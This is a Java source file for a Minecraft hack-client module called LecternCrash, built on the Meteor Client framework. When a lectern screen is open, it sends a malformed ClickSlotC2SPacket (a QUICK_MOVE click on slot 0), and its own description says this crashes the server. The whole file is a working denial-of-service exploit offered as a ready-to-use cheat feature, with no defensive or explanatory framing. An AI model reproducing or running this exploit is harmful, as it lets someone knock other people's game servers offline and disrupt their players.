package me.banana.modules;

import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import me.banana.BananaHack;
import meteordevelopment.meteorclient.systems.modules.Category;
import meteordevelopment.meteorclient.systems.modules.Module;
import net.minecraft.client.MinecraftClient;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.LecternScreenHandler;
import net.minecraft.screen.slot.SlotActionType;

import java.util.Objects;

import static me.banana.BananaHack.BANANAHACK;

public class LecternCrash extends Module {
    public LecternCrash() {
        super(BANANAHACK, "LecternCrash", "Crashes the server when you right click a lectern");
    }

    @Override
    public void onActivate() {
        MinecraftClient client = MinecraftClient.getInstance();
        if (client.player.currentScreenHandler instanceof LecternScreenHandler handler) {
            int syncId = handler.syncId;
            ClickSlotC2SPacket packet = new ClickSlotC2SPacket(syncId, 0, 0, SlotActionType.QUICK_MOVE, new ItemStack(Items.AIR), new Int2ObjectArrayMap<>());
            Objects.requireNonNull(client.getNetworkHandler()).sendPacket(packet);
            assert client.player != null;
            client.player.closeHandledScreen();
        }
    }
}
